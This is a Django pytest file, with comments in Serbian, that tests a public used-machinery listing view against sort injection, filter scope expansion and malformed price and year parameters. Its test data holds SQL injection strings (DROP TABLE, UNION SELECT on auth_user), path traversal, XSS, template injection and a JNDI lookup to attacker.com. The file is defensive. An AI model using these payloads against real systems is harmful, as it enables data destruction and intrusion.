"""Story 2.9 — Security + edge case tests (RED phase TDD).

Pokriva AC2 SECURITY guards:
- Sort whitelist enforcement (SM-D7 — prevent ORDER BY injection via ?sort=DROP TABLE)
- Stanje hardlock (SM-D2 — `?stanje=new` MORA biti silently ignored; queryset NE expand-uje
  scope na NEW proizvode jer condition='used' je hardcoded)
- Anonymous user access (javni katalog — NEMA LoginRequiredMixin)
- SQL injection via filter params (defensive parsing per SM-D11 prevents Decimal/int
  parser execute-ing arbitrary SQL)
- Negative cena / large godina bounds (defensive parser test)

Test scope (~7 tests):
- Sort SQL/ORDER BY injection: 2 testa (DROP TABLE attempt, semicolon-injection)
- Stanje scope expansion attempt: 2 testa (?stanje=new, ?stanje=anything)
- Anonymous access: 1 test (no login required)
- Decimal parser SQL injection attempt: 1 test
- Godina bounds: 1 test (defensive parser bounds)

Pokrenuti sa:
    docker compose -f compose/local.yml exec django uv run pytest \\
        apps/products/tests/test_used_machinery_security.py -v

Refs:
- 2-9-used-machinery-listing-sa-filterima.md (AC2 SECURITY + SM-D2/D7/D11)
- project-context.md § Security must-haves
"""

from __future__ import annotations


import pytest
from django.utils.translation import activate

from apps.brands.tests.factories import BrandFactory
from apps.products.tests.factories import UsedProductFactory

pytestmark = pytest.mark.django_db


# =============================================================================
# AC2 SECURITY — Sort whitelist (SM-D7): prevent ORDER BY injection
# =============================================================================


@pytest.mark.parametrize(
    "injection_payload",
    [
        "DROP TABLE products_product",
        "DROP TABLE products_product; SELECT * FROM auth_user",
        "1; DROP TABLE products_product",
        "name; --",
        "../../etc/passwd",
        "price_eur)) UNION SELECT * FROM auth_user --",
        "<script>alert(1)</script>",
    ],
)
def test_ac2_sort_sql_injection_falls_back_to_default(client, injection_payload):
    """AC2 + SM-D7 SECURITY: `?sort=<injection>` MORA biti silently fall-back-ovan na default
    sort (-created_at) — NEMA SQL error, NEMA execute injection. Whitelist enforcement.
    """
    activate("sr")
    brand = BrandFactory.create()
    UsedProductFactory.create(brand=brand, name="Sort Injection Defense")

    import urllib.parse

    encoded = urllib.parse.quote(injection_payload, safe="")
    response = client.get(
        f"/sr/mehanizacija/polovna/?sort={encoded}",
        HTTP_HOST="localhost",
    )

    assert response.status_code == 200, (
        f"GET sa ?sort=<injection> MORA biti silently handled, NIJE 500. "
        f"Injection payload: {injection_payload!r}, status {response.status_code}."
    )
    assert response.context.get("selected_sort") == "default", (
        f"Sa malicious sort, selected_sort MORA fallback-ovati na 'default'. "
        f"Payload: {injection_payload!r}, dobio {response.context.get('selected_sort')!r}."
    )


# =============================================================================
# AC2 SECURITY — Stanje hardlock (SM-D2): ?stanje=new ne expand-uje scope
# =============================================================================


def test_ac2_stanje_new_does_not_expand_scope_to_new_products(client):
    """AC2 + SM-D2 SECURITY: `?stanje=new` u URL-u MORA biti silently ignored —
    queryset i dalje filtruje condition='used' hardcoded; NE expand-uje na NEW.

    Threat model: javni URL ne sme biti repurposed kroz query param edit-ovanje.
    """
    activate("sr")
    brand = BrandFactory.create()
    used_product = UsedProductFactory.create(brand=brand, name="Used in Mech")
    # Kreiraj NEW product u istom mehanizacija scope-u (subcategory matches)
    new_in_scope = UsedProductFactory.create(brand=brand, name="New in Mech", condition="new")

    response = client.get(
        "/sr/mehanizacija/polovna/?stanje=new",
        HTTP_HOST="localhost",
    )

    assert response.status_code == 200
    product_pks = [p.pk for p in response.context["products"]]
    assert used_product.pk in product_pks
    assert new_in_scope.pk not in product_pks, (
        f"NEW product (pk={new_in_scope.pk}) NE SME biti vraćen sa ?stanje=new — "
        f"queryset MORA i dalje filtrirati condition='used' (SM-D2 hardlock). "
        f"Dobili: {product_pks!r}."
    )


def test_ac2_stanje_arbitrary_value_does_not_change_queryset(client):
    """AC2 + SM-D2: bilo koja `?stanje=<random>` vrednost MORA biti silently ignored;
    queryset svejedno vraća samo USED proizvode.
    """
    activate("sr")
    brand = BrandFactory.create()
    used = UsedProductFactory.create(brand=brand, name="Stanje Random Test")

    for arbitrary in ("refurbished", "asdf", "polovan", "%20"):
        response = client.get(
            f"/sr/mehanizacija/polovna/?stanje={arbitrary}",
            HTTP_HOST="localhost",
        )
        assert response.status_code == 200, (
            f"GET ?stanje={arbitrary!r} MORA biti 200 (silently ignored)."
        )
        product_pks = [p.pk for p in response.context["products"]]
        assert used.pk in product_pks, (
            f"USED product MORA biti vraćen bez obzira na ?stanje={arbitrary!r}. "
            f"Dobili: {product_pks!r}."
        )


# =============================================================================
# AC2 — Anonymous access (javni katalog — NEMA LoginRequiredMixin)
# =============================================================================


def test_ac2_anonymous_user_can_access_used_machinery_listing(client):
    """AC2: javni katalog — anonimni korisnici MORAJU moći pristupiti bez login-a.

    NEMA LoginRequiredMixin na UsedMachineryListView klasi.
    """
    activate("sr")
    BrandFactory.create()
    UsedProductFactory.create(name="Anon Access Test")

    # client je anonimni po default-u (Django test client)
    response = client.get("/sr/mehanizacija/polovna/", HTTP_HOST="localhost")
    assert response.status_code == 200, (
        f"Anonimni korisnik MORA dobiti HTTP 200 na javnom katalogu, dobio {response.status_code}. "
        "View NE SME zahtevati login (NEMA LoginRequiredMixin)."
    )


# =============================================================================
# AC2 SECURITY — Decimal parser SQL injection (SM-D11 defensive)
# =============================================================================


def test_ac2_cena_decimal_parser_silently_rejects_injection_attempts(client):
    """AC2 + SM-D11: `_parse_decimal` MORA silently reject injection payloads u cena
    parametru — NEMA SQL error, NEMA crash. Returns None → filter not applied.
    """
    activate("sr")
    brand = BrandFactory.create()
    UsedProductFactory.create(brand=brand, name="Decimal Parser Defense")

    import urllib.parse

    payloads = [
        "1 OR 1=1",
        "1'; DROP TABLE",
        "0); DELETE FROM",
        "${jndi:ldap://attacker.com}",
        "{{7*7}}",
    ]
    for payload in payloads:
        encoded = urllib.parse.quote(payload, safe="")
        response = client.get(
            f"/sr/mehanizacija/polovna/?cena_min={encoded}",
            HTTP_HOST="localhost",
        )
        assert response.status_code == 200, (
            f"Injection payload {payload!r} MORA biti silently handled, "
            f"dobio {response.status_code}."
        )
        # Filter ne primenjen → svi USED proizvodi su tu
        products = list(response.context["products"])
        assert len(products) >= 1, (
            f"Sa cena_min={payload!r} (invalid), queryset NE SME biti redukovan. "
            f"Dobio {len(products)} proizvoda."
        )


# =============================================================================
# AC2 — Godina parser bounds (SM-D11 defensive_parser pattern)
# =============================================================================


def test_ac2_godina_parser_rejects_out_of_bounds_values(client):
    """AC2 + SM-D11: _parse_int za godina param ima bounds (min_value=1900, max_value=2100).
    Vrednost van bounds → None → filter not applied.

    Mirror SM-D6 napomena: parser bounds (1900-2100) su NAMERNO šire od UI slider range
    (1990-current_year) za URL-edit resilience.
    """
    activate("sr")
    brand = BrandFactory.create()
    UsedProductFactory.create(brand=brand, name="Bounds Test", year=2018)

    # year=9999 (out of max_value=2100)
    response = client.get(
        "/sr/mehanizacija/polovna/?godina_max=9999",
        HTTP_HOST="localhost",
    )
    assert response.status_code == 200
    # Filter ignored (godina_max=9999 > max_value=2100 returns None)
    # — svi USED proizvodi su tu
    products = list(response.context["products"])
    assert len(products) >= 1

    # year=1500 (out of min_value=1900)
    response2 = client.get(
        "/sr/mehanizacija/polovna/?godina_min=1500",
        HTTP_HOST="localhost",
    )
    assert response2.status_code == 200
    products2 = list(response2.context["products"])
    assert len(products2) >= 1
